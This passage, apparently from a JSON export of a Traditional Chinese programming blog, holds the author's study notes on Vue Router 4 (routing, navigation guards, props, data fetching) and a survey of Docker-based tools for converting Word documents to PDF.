}\n}\n```\n\n\nGIT:[ef8040a99c655c68c20b92e8aceb47f64b7403c7](https://github.com/malagege/vue-router-test/commit/ef8040a99c655c68c20b92e8aceb47f64b7403c7)\n\n\n## 路由的匹配語法\n\n[路由的匹配語法 | Vue Router](https://next.router.vuejs.org/zh/guide/essentials/route-matching-syntax.html)\n\n基本上就是用正規表達式設定路由。這邊就不簡單實作\n\n```javascript=\nconst routes = [\n  // /:orderId -> 僅匹配數字\n  { path: '/:orderId(\\\\d+)' },\n  // /:productName -> 匹配其他任何內容\n  { path: '/:productName' },\n]\n\n```\n\n\n###  可重複的參數\n\n```javascript=\nconst routes = [\n  // /:chapters ->  匹配 /one, /one/two, /one/two/three, 等\n  { path: '/:chapters+' },\n  // /:chapters -> 匹配 /, /one, /one/two, /one/two/three, 等\n  { path: '/:chapters*' },\n]\n\n```\n\nrouter.resolve 組出 url\n\n```javascript=\n// 給定 { path: '/:chapters*', name: 'chapters' },\nrouter.resolve({ name: 'chapters', params: { chapters: [] } }).href\n// 產生 /\nrouter.resolve({ name: 'chapters', params: { chapters: ['a', 'b'] } }).href\n// 產生 /a/b\n\n// 給定 { path: '/:chapters+', name: 'chapters' },\nrouter.resolve({ name: 'chapters', params: { chapters: [] } }).href\n// 拋出錯誤，因為 `chapters` 為空 \n\n```\n\n`+`與`*` 的差別\n\n```javascript=\nconst routes = [\n  // 僅匹配數字\n  // 匹配 /1, /1/2, 等\n  { path: '/:chapters(\\\\d+)+' },\n  // 匹配 /, /1, /1/2, 等\n  { path: '/:chapters(\\\\d+)*' },\n]\n\n```\n\n### 可選參數\n\n> 請注意，* 在技術上也標誌著一個參數是可選的，但 ? 參數不能重複。\n\n```javascript=\nconst routes = [\n  // 匹配 /users 和 /users/posva\n  { path: '/users/:userId?' },\n  // 匹配 /users 和 /users/42\n  { path: '/users/:userId(\\\\d+)?' },\n]\n\n```\n\n\n## 嵌套路由(nested-routes)\n\n![](https://i.imgur.com/Djd7ZY4.png)\n\n兩個步驟\n\n1. 設定 router 的 children 屬性\n\n```javascript=\nconst routes = [\n    { path: '/', component: Home },\n    { path: '/about', component: About },\n    // 動態段以冒號開始\n    { path: '/users/:id', component: User ,\n      children: [\n        {\n          // 當 /user/:id/profile 匹配成功 \n          // UserProfile 將被渲染到 User 的 <router-view> 內部\n          path: 'profile',\n          component: UserProfile,\n        },\n        {\n          // 當 /user/:id/posts 匹配成功\n          // UserPosts 將被渲染到 User 的 <router-view> 內部\n          path: 'posts',\n          component: UserPosts,\n        },\n      ],\n    },\n```\n\n2. 設定目標組件(父層) router-view\n\n```htmlembedded=\n    <div>\n        User  {{ $route.params.id }}\n        <br>\n        <button v-on:click=\"test\"> on test</button>\n        <router-view></router-view>\n    </div>\n```\n\n連結: http://localhost:3000/#/users/1/profile\n\n\nGIT:[a0ee324aefb696a91645c1258181979cd7c35277](https://github.com/malagege/vue-router-test/commit/)\n\n### 設定嵌套路由首頁\n\n```javascript=\nconst routes = [\n    { path: '/', component: Home },\n    { path: '/about', component: About },\n    // 動態段以冒號開始\n    { path: '/users/:id', component: User ,\n      children: [\n        // UserHome will be rendered inside User's <router-view>\n        // when /user/:id is matched\n        // 當 /user/:id 匹配成功\n        // UserHome 將被渲染到 User 的 <router-view> 內部\n        { path: '', component: UserHome },\n```\n\n連結: http://localhost:3000/#/users/1/\n\nGIT:[1d362c35c2ad53966a8d1794e845f7a07fc5eafa](https://github.com/malagege/vue-router-test/commit/1d362c35c2ad53966a8d1794e845f7a07fc5eafa)\n\n官方範例:[Nested Views - Vue Router 4 examples - CodeSandbox](https://codesandbox.io/s/nested-views-vue-router-4-examples-hl326?initialpath=/users/eduardo&file=/src/main.js)\n\n\n## 編程式導航(Navigation Guards)\n\n### 跳頁到不同路徑網址\n\n原本標題「導航到不同的位置」，我覺得看不是很懂，看我改得比較白話，哈哈。\n\n> 注意：在 Vue 實例中，你可以通過 \\$router 訪問路由實例。因此你可以調用 this.$router.push。\n\n> 想要導航到不同的 URL，可以使用 router.push 方法。這個方法會向 history 棧添加一個新的記錄，所以，當用戶點擊瀏覽器後退按鈕時，會回到之前的 URL。\n\n> 當你點擊 `<router-link>` 時，內部會調用這個方法，所以點擊 `<router-link :to=\"...\">` 相當於調用 router.push(...) ：\n\n| 聲明式                     | 編程式              |\n|-------------------------|------------------|\n| <router-link :to=\"...\"> | router.push(...) |\n\n\n\n\n```javascript=\n// 字符串路徑\nrouter.push('/users/eduardo')\n\n// 帶有路徑的對象\nrouter.push({ path: '/users/eduardo' })\n\n// 命名的路由，並加上參數，讓路由建立 url\nrouter.push({ name: 'user', params: { username: 'eduardo' } })\n\n// 帶查詢參數，結果是 /register?plan=private\nrouter.push({ path: '/register', query: { plan: 'private' } })\n\n// 帶 hash，結果是 /about#team\nrouter.push({ path: '/about', hash: '#team' }\n```\n\n\n\n比較特別的是後面三個，用`query`和`hash`屬性前面沒帶過\n\n稍微查了一下，[這篇提到](https://blog.csdn.net/weixin_45846862/article/details/112182113)裡面提到使用`this.$route.query.參數`也可以抓到值\n\n[API Reference | Vue Router](https://next.router.vuejs.org/api/#query)\n\n\n```javascript\nconst username = 'eduardo'\n// 我們可以手動建立 url，但我們必須自己處理編碼\nrouter.push(`/user/${username}`) // -> /user/eduardo\n// 同樣\nrouter.push({ path: `/user/${username}` }) // -> /user/eduardo\n// 如果可能的話，使用 `name` 和 `params` 從自動 URL 編碼中獲益\nrouter.push({ name: 'user', params: { username } }) // -> /user/eduardo\n// `params` 不能與 `path` 一起使用\nrouter.push({ path: '/user', params: { username } }) // -> /user\n\n```\n\n我有嘗試使用參數帶中文，但沒有發現什麼問題\n\nGIT:[75bf26ebf64ec5c2c4dc6f5476e86bb517327e65](https://github.com/malagege/vue-router-test/commit/75bf26ebf64ec5c2c4dc6f5476e86bb517327e65)\n\n> 由於屬性 to 與 router.push 接受的對象種類相同，所以兩者的規則完全相同。\n> router.push 和所有其他導航方法都會返回一個 Promise，讓我們可以等到導航完成後才知道是成功還是失敗。我們將在 Navigation Handling 中詳細介紹。\n\n### 替換當前位置\n\n> 它的作用類似於 router.push，唯一不同的是，它在導航時不會向 history 添加新記錄，正如它的名字所暗示的那樣——它取代了當前的條目。\n\n| 聲明式                             | 編程式                 |\n|---------------------------------|---------------------|\n| <router-link :to=\"...\" replace> | router.replace(...) |\n\n\n```javascript=\nrouter.push({ path: '/home', replace: true })\n// 相當於\nrouter.replace({ path: '/home' })\n```\n\n### 回前一頁、下一頁\n\n> 該方法採用一個整數作為參數，表示在歷史堆棧中前進或後退多少步，類似於 `window.history.go(n)`\n\n```javascript=\n// 向前移動一條記錄，與 router.forward() 相同\nrouter.go(1)\n\n// 返回一條記錄，與router.back() 相同\nrouter.go(-1)\n\n// 前進 3 條記錄\nrouter.go(3)\n\n// 如果沒有那麼多記錄，靜默失敗\nrouter.go(-100)\nrouter.go(100)\n\n```\n\n## 命名路由\n\n> 除了 path 之外，你還可以為任何路由提供 name。這有以下優點：\n> \n>    - 沒有硬編碼的 URL\n>    - params 的自動編碼/解碼。\n>    - 防止你在 url 中出現打字錯誤。\n>    - 繞過路徑排序（如顯示一個）\n\n```javascript=\nconst routes = [\n  {\n    path: '/user/:username',\n    name: 'user',\n    component: User\n  }\n]\n\n```\n\n```htmlembedded=\n<router-link :to=\"{ name: 'user', params: { username: 'erina' }}\">\n  User\n</router-link>\n\n```\n\n與下面程式相同\n\n```javascript=\nrouter.push({ name: 'user', params: { username: 'erina' } }\n```\n\n\n[vue-router/app.js at dev · vuejs/vue-router](https://github.com/vuejs/vue-router/blob/dev/examples/named-routes/app.js)\n\n\n## 命名視圖\n\n簡單來說，設定 `router-view` 沒設定 name 後，預設名稱會是`default`。這邊看範例比較快。\n\n```htmlembedded=\n<router-view class=\"view left-sidebar\" name=\"LeftSidebar\"></router-view>\n<router-view class=\"view main-content\"></router-view>\n<router-view class=\"view right-sidebar\" name=\"RightSidebar\"></router-view>\n\n```\n\n```javascript=\nconst router = createRouter({\n  history: createWebHashHistory(),\n  routes: [\n    {\n      path: '/',\n      components: {\n        default: Home,\n        // LeftSidebar: LeftSidebar 的縮寫\n        LeftSidebar,\n        // 它們與 `<router-view>` 上的 `name` 屬性匹配\n        RightSidebar,\n      },\n    },\n  ],\n})\n\n```\n\n官方範例:[Named Views - Vue Router 4 examples - CodeSandbox](https://codesandbox.io/s/named-views-vue-router-4-examples-rd20l?file=/src/main.js)\n\n\n### 嵌套命名視圖\n\n我覺得這部分看官方文件比較清楚。\n\n[命名視圖 | Vue Router](https://next.router.vuejs.org/zh/guide/essentials/named-views.html#%E5%B5%8C%E5%A5%97%E5%91%BD%E5%90%8D%E8%A7%86%E5%9B%BE)\n\n\n官方範例: [Nested Named Views - Vue Router 4 examples - CodeSandbox](https://codesandbox.io/s/nested-named-views-vue-router-4-examples-re9yl?&initialpath=%2Fsettings%2Femails)\n\n## 重新導向和别名\n\n官方文件原翻譯: 重定向和别名\n\n\n### 重新導向(redirect)\n\n/search/screens -> /search?q=screens\n \n跟後端 redirect 意思差不多\n\n```\nconst routes = [{ path: '/home', redirect: '/' }]\n```\n\n也能指向一個 route 的名稱\n\n```\nconst routes = [{ path: '/home', redirect: { name: 'homepage' } }]\n\n```\n\n#### 動態導向(帶參數)\n\n```javascript=\nconst routes = [\n  {\n    // /search/screens -> /search?q=screens\n    path: '/search/:searchText',\n    redirect: to => {\n      // 方法接收目標路由作為參數\n      // return 重定向的字符串路徑/路徑對象\n      return { path: '/search', query: { q: to.params.searchText } }\n    },\n  },\n  {\n    path: '/search',\n    // ...\n  },\n]\n\n```\n\n#### 别名\n\n`/` 參照 `/home`。\n\n```\nconst routes = [{ path: '/', component: Homepage, alias: '/home' }]\n\n```\n\n\n> 通過別名，你可以自由地將 UI 結構映射到一個任意的 URL，而不受配置的嵌套結構的限制。**使別名以 / 開頭，以使嵌套路徑中的路徑成為絕對路徑。**你甚至可以將兩者結合起來，用一個數組提供多個別名：\n```javascript=\nconst routes = [\n  {\n    path: '/users',\n    component: UsersLayout,\n    children: [\n      // 為這 3 個 URL 呈現 UserList\n      // - /users\n      // - /users/list\n      // - /people\n      { path: '', component: UserList, alias: ['/people', 'list'] },\n    ],\n  },\n]\n\n```\n\nSEO 需要注意的事情:[Consolidate Duplicate URLs with Canonicals | Google Search Central](https://developers.google.com/search/docs/advanced/crawling/consolidate-duplicate-urls?hl=en&visit_id=637596083090705419-2476927526&rd=1)\n\n\n##  將 props 傳遞給路由組件(容易忘記?)\n\n```javascript=\nconst User = {\n  template: '<div>User {{ $route.params.id }}</div>'\n}\nconst routes = [{ path: '/user/:id', component: User }]\n\n```\n\n替換\n\n```javascript=\nconst User = {\n  props: ['id'],\n  template: '<div>User {{ id }}</div>'\n}\nconst routes = [{ path: '/user/:id', component: User, props: true }]\n\n```\n\n簡單來說 route 設定多了 `props:true`，prop也需要設定對應變數\n\n\n### Boolean mode\n\n> 當 props 設置為 true 時，route.params 將被設置為組件的 props。\n\n#### 命名視圖\n\n簡單來說，跟上面用法差不多。\n\n```javascript=\nconst routes = [\n  {\n    path: '/user/:id',\n    components: { default: User, sidebar: Sidebar },\n    props: { default: true, sidebar: false }\n  }\n]\n```\n\n### 物件給值(固定給值)\n\n這邊是固定給值\n\n```javascript=\nconst routes = [\n  {\n    path: '/promotion/from-newsletter',\n    component: Promotion,\n    props: { newsletterPopup: false }\n  }\n]\n\n```\n\n\n### 函式給值(重要?)\n\n```javascript=\nconst routes = [\n  {\n    path: '/search',\n    component: SearchUser,\n    props: route => ({ query: route.query.q })\n  }\n]\n\n````\n\n官方範例:[vue-router/app.js at dev · vuejs/vue-router](https://github.com/vuejs/vue-router/blob/dev/examples/route-props/app.js)\n\n這邊就不實戰，簡單做個結論，動態給值，可使用props,function 方式進去，固定方式可以用 object mode\n\n\n## 歷史模式\n\n都是Web 常見的兩種`hash`,`html5 history api`\n\n### hash\n\n```javascript=\nimport { createRouter, createWebHashHistory } from 'vue-router'\n\nconst router = createRouter({\n  history: createWebHashHistory(),\n  routes: [\n    //...\n  ],\n})\n\n```\n\n###  HTML5 模式\n\n> 用 createWebHistory() 创建 HTML5 模式，推荐使用这个模式：\n\n\n```javascript=\nimport { createRouter, createWebHistory } from 'vue-router'\n\nconst router = createRouter({\n  history: createWebHistory(),\n  routes: [\n    //...\n  ],\n})\n\n\n```\n\n\n### 伺服器配置\n\n[不同的歷史模式 | Vue Router](https://next.router.vuejs.org/zh/guide/essentials/history-mode.html#%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E7%A4%BA%E4%BE%8B)\n\n~~官方竟然沒放 Traefik ，我自己爬文找一下。~~\n我竟然犯蠢了...，Traefik 不是 Web Server，所以我應該是要改代理後面的Web Server。\n\n參考:[Nginx try_files to traefik ingressrout? - Traefik / Traefik v2 - Traefik Labs Community Forum](https://community.traefik.io/t/nginx-try-files-to-traefik-ingressrout/6915)\n\n> Sorry, not clear.\n> \n> Nginx is a web server not just a proxy like Traefik, and Traefik does not have a feature similar to try_files simply because it's not a web server.\n>  \n> Also \"not working\" is not a very good problem description. How do you test, what results are you expecting and what are you observing instead?\n\n\n## 導航守衛(Navigation Guards)\n\n\n### 全局前置守衛\n\n```javascript=\nconst router = createRouter({ ... })\n\nrouter.beforeEach((to, from) => {\n  // ...\n  // 返回 false 以取消導航\n  return false\n})\n\n```\n\n> 當一個導航觸發時，全局前置守衛按照創建順序調用。守衛是異步解析執行，此時導航在所有守衛 resolve 完之前一直處於等待中。\n\n這邊有去做個實作，第一次進去，to 和 from 都會有值，這邊設定一半機率會跳頁!!簡單來說，to 是要轉頁面，from 是來源頁，當回傳 false時候，會轉到 from 。所以這就是為什麼第一次進去，from ,to 都是一樣，不會卡住問題\n\n```javascript=\nrouter.beforeEach((to, from) => {\n  console.log('beforeEach START')\n  console.log('to',to)\n  console.log('from',from)\n  console.log('beforeEach END')\n  if(Math.random()> 0.5) return true\n  // ...\n  // 返回 false 以取消導航\n  return false\n})\n\n```\n\n> 每個守衛方法接收兩個參數：\n> \n>    - to: 即將要進入的目標 用一種標準化的方式\n>    - from: 當前導航正要離開的路由 用一種標準化的方式\n> \n> 可以返回的值如下:\n> \n>    - false: 取消當前的導航。如果瀏覽器的 URL 改變了(可能是用戶手動或者瀏覽器後退按鈕)，那麼 URL 地址會重置到 from 路由對應的地址。\n>    - 一個路由地址: 通過一個路由地址跳轉到一個不同的地址，就像你調用 router.push() 一樣，你可以設置諸如 replace: true 或 name: 'home' 之類的配置。當前的導航被中斷，然後進行一個新的導航，就和 from 一樣。\n\n\n### 錯誤監聽\n\n> 如果遇到了意料之外的情況，可能會拋出一個 Error。這會取消導航並且調用 router.onError() 註冊過的回調。\n> \n> 如果什麼都沒有，undefined 或返回 true，則導航是有效的，並調用下一個導航守衛\n\n```javascript=\nrouter.beforeEach((to, from) => {\n  console.log('beforeEach START')\n  console.log('to',to)\n  console.log('from',from)\n  console.log('beforeEach END')\n  a[2]\n  if(Math.random()> 0.5) return true\n  // ...\n  // 返回 false 以取消導航\n  return false\n})\n\nrouter.onError((error,to,from)=>{\n  console.log('Error START');\n  console.log('error',error);\n  console.log('to', to);\n  console.log('from', from);\n  console.log('Error END')\n})\n\n``` \n\n\n![](https://i.imgur.com/AI8VPxo.png)\n\n\n#### 可用 Promise工作方式\n\n```javascript=\nrouter.beforeEach(async (to, from) => {\n  // canUserAccess() 返回 `true` 或 `false`\n  return await canUserAccess(to)\n})\n```\n\n\n####  可選的第三個參數 next\n\n> 在之前的 Vue Router 版本中，也是可以使用 第三個參數 next 的。這是一個常見的錯誤來源，可以通過 RFC 來消除錯誤。然而，它仍然是被支持的，這意味著你可以向任何導航守衛傳遞第三個參數。在這種情況下，確保 next 在任何給定的導航守衛中都被嚴格調用一次。它可以出現多於一次，但是只能在所有的邏輯路徑都不重疊的情況下，否則鉤子永遠都不會被解析或報錯。這裡有一個在用戶未能驗證身份時重定向到/login的錯誤用例：\n\n```javascript=\n// GOOD\nrouter.beforeEach((to, from, next) => {\n  if (to.name !== 'Login' && !isAuthenticated) next({ name: 'Login' })\n  else next()\n})\n\n```\n\n簡單來說，這邊簡單實作是否登入動作導向登入頁。`next()`裡面空值，會進去`to`頁面，假如有指定next裡面參數，會進去到指定頁面。\n\n這邊我們看到，這邊沒有return ture/false，我很好奇我這邊return false會怎麼樣?結論，`next()`會執行跳頁動作，所以return true/false就沒有什麼意思。\n\n```javascript=\nrouter.beforeEach((to, from, next) => {\n  if (to.name === 'about'){\n    next()\n  }else{\n    next({ name: 'about' })\n  }\n  // else next()\n  return false\n})\n```\n\n\n### 全局解析守衛\n\n> 你可以用 router.beforeResolve 註冊一個全局守衛。這和 router.beforeEach 類似，因為它在 每次導航時都會觸發，但是確保在導航被確認之前，同時在所有組件內守衛和異步路由組件被解析之後，解析守衛就被正確調用。這裡有一個例子，確保用戶可以訪問自定義 meta 屬性 requiresCamera 的路由：\n\n```javascript=\nrouter.beforeResolve(async to => {\n  if (to.meta.requiresCamera) {\n    try {\n      await askForCameraPermission()\n    } catch (error) {\n      if (error instanceof NotAllowedError) {\n        // ... 處理錯誤，然後取消導航\n        return false\n      } else {\n        // 意料之外的錯誤，取消導航並把錯誤傳給全局處理器\n        throw error\n      }\n    }\n  }\n})\n```\n\n這邊可以進行權限判斷。\n\n\n### 全局後置鉤子\n\n```javascript=\nrouter.afterEach((to, from) => {\n  sendToAnalytics(to.fullPath)\n})\n```\n\n或\n\n```javascript=\nrouter.afterEach((to, from, failure) => {\n  if (!failure) sendToAnalytics(to.fullPath)\n})\n```\n\n[等待导航结果 | Vue Router](https://next.router.vuejs.org/zh/guide/advanced/navigation-failures.html)\n\n\n#### 路由(route)獨享的守衛\n\n```javascript=\nconst routes = [\n  {\n    path: '/users/:id',\n    component: UserDetails,\n    beforeEnter: (to, from) => {\n      // reject the navigation\n      return false\n    },\n  },\n]\n\n```\n\n\n> beforeEnter 守衛 只在進入路由時觸發，不會在 params、query 或 hash 改變時觸發。例如，從 /users/2 進入到 /users/3 或者從 /users/2#info 進入到 /users/2#projects。它們只有在 從一個不同的 路由導航時，才會被觸發。\n> \n> 你也可以將一個函數數組傳遞給 beforeEnter，這在為不同的路由重用守衛時很有用：\n\n```javascript=\nfunction removeQueryParams(to) {\n  if (Object.keys(to.query).length)\n    return { path: to.path, query: {}, hash: to.hash }\n}\n\nfunction removeHash(to) {\n  if (to.hash) return { path: to.path, query: to.query, hash: '' }\n}\n\nconst routes = [\n  {\n    path: '/users/:id',\n    component: UserDetails,\n    beforeEnter: [removeQueryParams, removeHash],\n  },\n  {\n    path: '/about',\n    component: UserDetails,\n    beforeEnter: [removeQueryParams],\n  },\n]\n\n```\n\nbeforeEnter 這邊是設定在 route，可以帶路陣列方式。\n\n#### 組件內的守衛\n\n>  可用的配置 API\n> \n> 你可以為路由組件添加以下配置：\n> \n>    - beforeRouteEnter\n>    - beforeRouteUpdate\n>    - beforeRouteLeave\n\n\n```javascript=\nconst UserDetails = {\n  template: `...`,\n  beforeRouteEnter(to, from) {\n    // 在渲染該組件的對應路由被驗證前調用\n    // 不能獲取組件實例 `this` ！\n    // 因為當守衛執行時，組件實例還沒被創建！\n  },\n  beforeRouteUpdate(to, from) {\n    // 在當前路由改變，但是該組件被覆用時調用\n    // 舉例來說，對於一個帶有動態參數的路徑 `/users/:id`，在 `/users/1` 和 `/users/2` 之間跳轉的時候，\n    // 由於會渲染同樣的 `UserDetails` 組件，因此組件實例會被覆用。而這個鉤子就會在這個情況下被調用。\n    // 因為在這種情況發生的時候，組件已經掛載好了，導航守衛可以訪問組件實例 `this`\n  },\n  beforeRouteLeave(to, from) {\n    // 在導航離開渲染該組件的對應路由時調用\n    // 與 `beforeRouteUpdate` 一樣，它可以訪問組件實例 `this`\n  },\n}\n\n```\n\n\n常用 beforeRouteLeave\n\n\n```javascript=\nbeforeRouteLeave (to, from) {\n  const answer = window.confirm('Do you really want to leave? you have unsaved changes!')\n  if (!answer) return false\n}\n\n```\n\n### 完整的導航解析流程\n\n    導航被觸發。\n    在失活的組件裡調用 beforeRouteLeave 守衛。\n    調用全局的 beforeEach 守衛。\n    在重用的組件裡調用 beforeRouteUpdate 守衛(2.2+)。\n    在路由配置裡調用 beforeEnter。\n    解析異步路由組件。\n    在被激活的組件裡調用 beforeRouteEnter。\n    調用全局的 beforeResolve 守衛(2.5+)。\n    導航被確認。\n    調用全局的 afterEach 鉤子。\n    觸發 DOM 更新。\n    調用 beforeRouteEnter 守衛中傳給 next 的回調函數，創建好的組件實例會作為回調函數的參數傳入。\n    \n    \n\n\n## 路由元信息\n\n可針對 route 設定 meta 做一些事情判斷\n\n\n```javascript=\nconst routes = [\n  {\n    path: '/posts',\n    component: PostsLayout,\n    children: [\n      {\n        path: 'new',\n        component: PostsNew,\n        // 只有經過身份驗證的用戶才能創建帖子\n        meta: { requiresAuth: true }\n      },\n      {\n        path: ':id',\n        component: PostsDetail\n        // 任何人都可以閱讀文章\n        meta: { requiresAuth: false }\n      }\n    ]\n  }\n]\n\n```\n\n\n```javascript=\nrouter.beforeEach((to, from) => {\n  // 而不是去檢查每條路由記錄\n  // to.matched.some(record => record.meta.requiresAuth)\n  if (to.meta.requiresAuth && !auth.isLoggedIn()) {\n    // 此路由需要授權，請檢查是否已登錄\n    // 如果沒有，則重定向到登錄頁面\n    return {\n      path: '/login',\n      // 保存我們所在的位置，以便以後再來\n      query: { redirect: to.fullPath },\n    }\n  }\n})\n```\n\n\n## 懶加載\n\n原寫法\n```javascript=\nimport About from './components/About.vue'\n\nconst routes = [\n    { path: '/', component: Home },\n    { name:'about', path: '/about', component: About },\n```\n\n新寫法\n\n```javascript=\nconst About = import('./components/About.vue')\n\nconst routes = [\n    { path: '/', component: Home },\n    { name:'about', path: '/about', component: About },\n```\n\n簡單來說，變動只有第一行。\n**2021-06-20目前 webpack才能用的樣子，Vite不能樣子**\n\n## 獲取資料(重點)\n\n當初我在想，載入資料不就寫在 `create` 就好了嗎?後來我發現，不能這樣，所以官方範例都用 `$watch` 去做監聽參數。\n\n\n[API — Vue.js](https://cn.vuejs.org/v2/api/#vm-watch)\n\n有兩個方式\n\n```htmlembedded=\n<template>\n  <div class=\"post\">\n    <div v-if=\"loading\" class=\"loading\">Loading...</div>\n\n    <div v-if=\"error\" class=\"error\">{{ error }}</div>\n\n    <div v-if=\"post\" class=\"content\">\n      <h2>{{ post.title }}</h2>\n      <p>{{ post.body }}</p>\n    </div>\n  </div>\n</template>\n\n```\n\n\n方式一\n\n```javascript=\nexport default {\n  data() {\n    return {\n      loading: false,\n      post: null,\n      error: null,\n    }\n  },\n  created() {\n    // watch 路由的參數，以便再次獲取數據\n    this.$watch(\n      () => this.$route.params,\n      () => {\n        this.fetchData()\n      },\n      // 組件創建完後獲取數據，\n      // 此時 data 已經被 observed 了\n      { immediate: true }\n    )\n  },\n  methods: {\n    fetchData() {\n      this.error = this.post = null\n      this.loading = true\n      // replace `getPost` with your data fetching util / API wrapper\n      // 用你的數據獲取 util 或 API 替換 `getPost`\n      getPost(this.$route.params.id, (err, post) => {\n        this.loading = false\n        if (err) {\n          this.error = err.toString()\n        } else {\n          this.post = post\n        }\n      })\n    },\n  },\n}\n\n```\n\n使用 randomuser 參照官方做個簡單範例\n\nGIT: [6995135924b391a6cd9fe3f8564e3aa80051b036](https://github.com/malagege/vue-router-test/commit/6995135924b391a6cd9fe3f8564e3aa80051b036)\n\n方式二\n\n```javascript=\nexport default {\n  data() {\n    return {\n      post: null,\n      error: null,\n    }\n  },\n  beforeRouteEnter(to, from, next) {\n    getPost(to.params.id, (err, post) => {\n      next(vm => vm.setData(err, post))\n    })\n  },\n  // 路由改變前，組件就已經渲染完了\n  // 邏輯稍稍不同\n  async beforeRouteUpdate(to, from) {\n//    this.post = null\n//    try {\n//      this.post = await getPost(to.params.id)\n//    } catch (error) {\n//      this.error = error.toString()\n//    }\n    getUser(to.params.id, (err, User) => {\n      this.setData(err,User)\n    })\n  },\n  methods: {\n    setData (err, User) {\n      if (err) {\n        this.error = err.toString()\n      } else {\n        this.User = User\n      }\n    }\n  }\n\n\n```\n\n官方忘記加了 setData method，回看 v3 版本文件有這個 method\n\nGIT: [8b717a40aa0169fcd8a6fb8eaf3500f65119c428](https://github.com/malagege/vue-router-test/commit/8b717a40aa0169fcd8a6fb8eaf3500f65119c428)","tags":["vue router"],"categories":["Vue"]},{"title":"Word (docx) 轉 pdf 方法","url":"%2Fblog%2F2021%2F06%2F27%2FWord-docx-%E8%BD%89-pdf-%E6%96%B9%E6%B3%95%2F","content":"\n之前有做過類似做處理 Word 文章\n[php-excel-templator 用範本(template)快速產生Excel方法 | 程式狂想筆記](https://malagege.github.io/blog/2019/09/03/php-excel-templator-%E7%94%A8%E7%AF%84%E6%9C%AC-template-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9FExcel%E6%96%B9%E6%B3%95/)\n[Word,Excel的相關template套件小記 | 程式狂想筆記](https://malagege.github.io/blog/2019/05/05/Word-Excel%E7%9A%84%E7%9B%B8%E9%97%9Ctemplate%E5%A5%97%E4%BB%B6%E5%B0%8F%E8%A8%98/)\n但沒對做轉 PDF 方法\n\n<!--more-->\n\n## .Net 方案\n[Create Word (DOCX) or PDF on Docker container from .NET Core](https://www.gemboxsoftware.com/document/examples/create-word-pdf-on-docker-net-core/5902)\n\n\n[Install Microsoft Office In Windows Container | by Jung-Hyun Nam | Dev Genius](https://blog.devgenius.io/install-microsoft-office-in-windows-container-ce05877138fd)\n\nMicrosoft.Office.Interop.Word\n\n\n我後來想找 Docker 可以用的，但 MS Office 只能用在 Widnow ，但感覺用 MS Office 很難做 Docker 執行，後來發現找 OpenOffice 才找到有直接能用的，gotenberg 真的太棒了。\n\n## 其他方案\n\n[java如何實現word轉PDF？ - 知乎](https://www.zhihu.com/question/54953944)\n\n\n> 目前就幾種方法\n> 1、poi + itext。先轉html再繪製，聽說格式有差異。比較複雜，格式兼容差，跨平台。\n> 2、借助openoffice我覺得不要選這個， openoffice 和 ms office 的格式差異挺大的，還不如jacob。\n> 3、jacob + ms office需要借助本地 office ，格式兼容最好，最後的備選方案。\n> 4、docx4j的export pdf組件。我覺得如果是格式不是很複雜的情況，應該用這個比較好（在office開源界，poi第一它> 應該第二），或者是第5項中的其他方案。plutext/docx4j-export-FO\n> 5、aspose等其他組件。\n\n參考一些方案找現成的\n\n### convert-document\n\n[occrp-attic/convert-document: A docker container for LibreOffice and unoconv, used to generate PDF files from office-type documents.](https://github.com/occrp-attic/convert-document)\n\n可以使用，但是中文會變亂碼。但有猜是字型的問題，可參考: [解決OpenOffice格式轉換中文亂碼終極解決方案 - IT閱讀](https://www.itread01.com/content/1548558560.html)\n\n```shell=\ndocker pull alephdata/convert-document\ndocker run -p 3000:3000 -ti alephdata/convert-document\n```\n\n### officeconverter\n\n[EugenMayer/officeconverter: Convert file formats like docx, xlx to other formats like pdf, png - based on jodconverter and libreoffice](https://github.com/EugenMayer/officeconverter)\n\n我執行不能使用...\n但我有找到相關的\n[EugenMayer/docker-image-jodconverter: Docker image with jodconverter + libreoffice for document conversion through a REST api](https://github.com/EugenMayer/docker-image-jodconverter)\n\n```shell=\ndocker run --memory 512m --rm -p 8080:8080 eugenmayer/jodconverter:gui\ndocker run --memory 512m --rm -p 8080:8080 eugenmayer/jodconverter:rest\n```\n\n不知是我的電腦太爛??我執行公司複雜 Word 花了一分多鐘...\n\n\n### office2pdf\n\n[microacup/office2pdf: convert office document（word、ppt）to pdf](https://github.com/microacup/office2pdf)\n\nms office , openoffice Java 範例程式使用。\n都有現成的程式，手動測試一下，發現 gradle 不能用(不知道是版本問題??)\n`試一下改成將compile改成implementation，testCompile改成testImplementation,然後Sync`\n就能正常行\n\nbuild.gradle\n```groovy=\ngroup 'me.meiqiu.test'\nversion '1.0-SNAPSHOT'\n\napply plugin: 'java'\n\nsourceCompatibility = 1.8\n\nrepositories {\n    mavenLocal()\n    mavenCentral()\n}\n\ndependencies {\n    // OpenOffice依赖的\n    implementation (\n            'org.openoffice:unoil:4.1.2',\n            'org.openoffice:juh:4.1.2',\n            'org.openoffice:ridl:4.1.2',\n            'org.openoffice:jurt:4.1.2',\n            'org.jodconverter:jodconverter-core:4.2.0',\n            'org.jodconverter:jodconverter-local:4.2.0'\n    )\n\n    // 调用windows office组件的适配器：jaccb.jar等\n    implementation fileTree(dir:'libs',include:['*.jar'])\n\n    testImplementation group: 'junit', name: 'junit', version: '4.12'\n    testImplementation group: 'org.slf4j', name: 'slf4j-log4j12', version: '1.7.25'\n}\n\n```\n\n記得要做\n> JACOB is a JAVA-COM Bridge that allows you to call COM Automation components from Java. It uses JNI to make native calls to the COM libraries. JACOB runs on x86 and x64 environments supporting 32 bit and 64 bit JVMs . 需要把jacob-x.xx-x64.dll放到java/bin(与java.exe相同)目录下\n\n![](https://i.imgur.com/10BXXO2.jpg)\n\n\n### SpringBoot使用LibreOffice轉換PDF 程式範例\n\n[SpringBoot使用LibreOffice轉換PDF - SegmentFault 思否](https://segmentfault.com/a/1190000015129654)\n\n\n### gotenberg\n\n[thecodingmachine/gotenberg: A Docker-powered stateless API for converting HTML, Markdown and Office documents to PDF](https://github.com/thecodingmachine/gotenberg)\n\ngotenberg 這個很棒！中文不會亂碼。用 API 就能轉。原本一分鐘可以執行的，這個不到幾秒就出來了。\n\n別的程式也能串接\n- [kaipaysen/gotenberg.client.java: Java Client for Gotenberg](https://github.com/kaipaysen/gotenberg.client.java)\n- [thecodingmachine/gotenberg-php-client: PHP client for the Gotenberg API](https://github.com/thecodingmachine/gotenberg-php-client)\n\n\n## 彩蛋\n\n發現作者還有滿有趣專案[thecodingmachine/workadventure: A collaborative web application 